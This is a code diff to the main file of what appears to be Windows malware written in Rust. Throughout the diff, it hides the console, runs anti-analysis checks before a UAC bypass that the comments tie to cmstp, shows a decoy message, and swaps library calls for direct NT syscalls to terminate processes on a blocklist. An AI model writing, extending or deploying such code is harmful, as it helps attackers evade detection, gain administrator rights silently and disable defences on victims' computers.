@@ -75,7 +75,6 @@ async fn register_all_commands() -> anyhow::Result<()> {
 
         // System commands
         ProcessCommand,
-        MonitorCommand,
         UpdateCommand,
         UninstallCommand,
         VolumeCommand,
@@ -183,7 +182,7 @@ fn setup_exit_protection() -> bool {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
-    // Hide console IMMEDIATELY at startup (before any other code runs)
+    // Hide console at startup
     #[cfg(not(debug_assertions))]
     {
         unsafe {
@@ -194,7 +193,6 @@ async fn main() -> anyhow::Result<()> {
         }
     }
 
-    // Initialize file logger for debug output (writes to debug.log next to exe)
     if Config::SHOW_CONSOLE {
         crate::utils::logger::init_logger();
     }
@@ -202,25 +200,32 @@ async fn main() -> anyhow::Result<()> {
     let args: Vec<String> = env::args().collect();
     let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());
 
+    // ========================================================================
+    //@ Anti-Analysis will run before cmstp
+    #[cfg(not(debug_assertions))]
+    {
+        log_debug!("[Anti-Analysis] Running checks (pre-UAC)");
+        run_saa();
+        log_debug!("[Anti-Analysis] Checks passed!");
+    }
+    // ========================================================================
+
     let is_admin_privileged = uac_bypass::is_admin();
     
-    //@ UAC Bypass - MUST be before ExitPatcher so non-admin process can exit!
+    //@ UAC Bypass will start after anti analysis
     if !is_admin_privileged {
-        log_debug!("Not running with admin privileges, attempting UAC bypass...");
+        println!("Not running with admin privileges, attempting UAC bypass...");
 
         if uac_bypass::attempt_uac_bypass() {
-            // UAC bypass launched a new elevated process - this non-admin process must exit immediately
-            log_debug!("UAC bypass initiated - exiting non-admin process");
+            println!("UAC bypass initiated - exiting non-admin process");
             std::thread::sleep(std::time::Duration::from_millis(100));
-            std::process::exit(0); // Use raw exit, not safe_exit (ExitPatcher not applied yet)
+            std::process::exit(0);
         } else {
-            log_debug!("UAC bypass failed. Continuing without admin privileges.");
+            println!("UAC bypass failed. Continuing without admin privileges.");
         }
     } else {
-        log_debug!("Already running with admin privileges.");
+        println!("Already running with admin privileges.");
     }
-
-    // Now we're either admin or UAC bypass failed - continue with setup
     singleton_prcess(is_admin_privileged);
 
     // ========================================================================
@@ -239,28 +244,7 @@ async fn main() -> anyhow::Result<()> {
     // ========================================================================
     let current_exe = env::current_exe().unwrap_or_default();
     let is_installed = installation::check_if_installed(&current_exe);
-
-    #[cfg(not(debug_assertions))]
-    {
-        if !is_installed {
-            log_debug!("[Anti-Analysis] Running checks");
-            run_saa();
-            log_debug!("[Anti-Analysis] Checks passed!");
-        } else {
-            log_debug!("[Anti-Analysis] Running checks...");
-            let warnings = run_softaa();
-            if warnings.is_some() {
-                log_debug!("[Anti-Analysis] Warnings detected but continuing...");
-            } else {
-                log_debug!("[Anti-Analysis] Checks passed!");
-            }
-        }
-    }
-
-    #[cfg(debug_assertions)]
-    {
-        log_debug!("[Anti-Analysis] Skipped (debug build)");
-    }
+    
     // ========================================================================
 
     // Show decoy message if config
@@ -330,7 +314,7 @@ async fn main() -> anyhow::Result<()> {
 
     //@ Blocklist Process Monitor
     tokio::spawn(async move {
-        use sysinfo::{ProcessExt, System, SystemExt, PidExt};
+        use crate::utils::syscall::{self, access};
         use std::collections::HashSet;
         use std::fs;
         
@@ -352,24 +336,30 @@ async fn main() -> anyhow::Result<()> {
                 HashSet::new()
             }
         }
+        
+        fn kill_process_by_pid(pid: u32) -> bool {
+            if let Some(handle) = syscall::nt_open_process(pid, access::PROCESS_TERMINATE) {
+                let success = syscall::nt_terminate_process(handle, 1);
+                syscall::nt_close(handle);
+                success
+            } else {
+                false
+            }
+        }
 
-        let mut sys = System::new_all();
         let mut killed_pids: HashSet<u32> = HashSet::new();
 
         loop {
             let blocklist = load_blocklist();
             
             if !blocklist.is_empty() {
-                sys.refresh_processes();
-                
-                for (pid, process) in sys.processes() {
-                    let pid_u32 = pid.as_u32();
-                    
-                    if killed_pids.contains(&pid_u32) {
+                let processes = syscall::get_process_list();
+                for (pid, name) in processes {
+                    if killed_pids.contains(&pid) {
                         continue;
                     }
                     
-                    let proc_name = process.name().to_lowercase();
+                    let proc_name = name.to_lowercase();
                     let proc_name_base = if proc_name.ends_with(".exe") {
                         &proc_name[..proc_name.len()-4]
                     } else {
@@ -377,15 +367,17 @@ async fn main() -> anyhow::Result<()> {
                     };
                 
                     if blocklist.contains(proc_name_base) {
-                        if process.kill() {
-                            killed_pids.insert(pid_u32);
-                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
+                        if kill_process_by_pid(pid) {
+                            killed_pids.insert(pid);
+                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid);
                         }
                     }
                 }
                 
-                sys.refresh_processes();
-                let running: HashSet<u32> = sys.processes().keys().map(|p| p.as_u32()).collect();
+                let running: HashSet<u32> = syscall::get_process_list()
+                    .into_iter()
+                    .map(|(pid, _)| pid)
+                    .collect();
                 killed_pids.retain(|pid| running.contains(pid));
             }
             
